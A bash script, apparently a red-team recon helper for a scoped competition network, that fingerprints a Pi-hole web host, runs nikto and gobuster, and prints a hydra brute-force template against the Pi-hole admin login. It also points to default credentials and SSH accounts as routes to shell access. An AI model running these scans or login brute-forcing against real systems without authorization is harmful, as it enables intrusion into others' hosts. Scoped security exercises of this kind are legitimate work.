#!/usr/bin/env bash
# ============================================================
# 04_web_cherrybomb.sh — target: cherrybomb.misty.view (.52)
# Ubuntu 25.04. Scored services: Pi-hole + HTTP.
# ============================================================
# Usage:
#   TARGET_TEAM=07 ./04_web_cherrybomb.sh
#
# Requires: curl, nikto, gobuster (or feroxbuster), hydra
# ============================================================
set -euo pipefail
cd "$(dirname "$0")"
source ./scope.env

TARGET="$HOST_CHERRYBOMB"
assert_in_scope "$TARGET"
OUT="$OUTDIR/web_cherrybomb"
mkdir -p "$OUT"

echo "=== HTTP / Pi-hole enumeration: $TARGET ==="

# 1. Grab headers / basic fingerprint on common web ports
for port in 80 443 8080; do
    echo "[*] Probing port $port..."
    curl -s -m 5 -D - -o /dev/null "http://$TARGET:$port/" 2>/dev/null | tee -a "$OUT/headers_${port}.txt" || true
done

# 2. Pi-hole admin UI lives at /admin by default
echo "[*] Checking default Pi-hole admin path..."
curl -s -m 5 -o /dev/null -w "HTTP %{http_code} -> http://$TARGET/admin/\n" "http://$TARGET/admin/" || true
curl -s -m 5 -o /dev/null -w "HTTP %{http_code} -> http://$TARGET/admin/login.php\n" "http://$TARGET/admin/login.php" || true

# 3. Nikto general web vuln scan (open-source)
if command -v nikto >/dev/null 2>&1; then
    echo "[*] Running nikto..."
    nikto -host "http://$TARGET/" -output "$OUT/nikto.txt" || true
else
    echo "[!] nikto not installed (apt install nikto). Skipping."
fi

# 4. Directory/content discovery
if command -v gobuster >/dev/null 2>&1; then
    echo "[*] Running gobuster dir scan..."
    WORDLIST="/usr/share/wordlists/dirb/common.txt"
    [[ -f "$WORDLIST" ]] || WORDLIST=""
    if [[ -n "$WORDLIST" ]]; then
        gobuster dir -u "http://$TARGET/" -w "$WORDLIST" -o "$OUT/gobuster.txt" -q || true
    else
        echo "[!] Default wordlist not found, point gobuster -w at one you have."
    fi
else
    echo "[!] gobuster not installed. Skipping content discovery."
fi

# 5. Pi-hole admin login brute force (once you've confirmed /admin/login.php exists)
printf "%s\n" "${USERS_CHERRYBOMB[@]}" > "$OUT/userlist.txt"

cat <<'EOF'

[*] Pi-hole's web admin uses a single password (not per-user), so a
    userlist doesn't apply there — focus on:
      - default/released competition credentials first
      - checking for an exposed Pi-hole API token / session misconfig
      - the system-level SSH/user accounts in userlist.txt (pi-hole
        host itself) if you want shell access rather than just DNS
        admin panel access

[*] If this were a normal external web app, a Hydra http-post-form
    brute would look like:

    hydra -l admin -P ./wordlists/comp_default_creds.txt \
          TARGET http-post-form \
          "/admin/login.php:pw=^PASS^:incorrect"

    Adjust the form field name/failure string to match what you see
    in the actual login page source (view-source / curl -s the page).

EOF

echo "=== Done. Review $OUT/ ==="
